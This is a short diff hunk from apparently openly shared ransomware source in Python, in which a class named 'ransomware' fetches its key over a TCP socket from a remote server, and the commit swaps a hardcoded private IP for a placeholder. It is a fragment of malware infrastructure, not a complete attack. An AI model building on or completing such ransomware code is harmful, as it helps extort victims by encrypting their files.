@@ -55,7 +55,7 @@ class ransomware:
 
     def save_key(self):
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        IP_ADDRESS = '10.211.55.8'
+        IP_ADDRESS = 'PUT IP HERE'
         PORT = 9090
         client_socket.connect((IP_ADDRESS, PORT))
         key = client_socket.recv(1024)
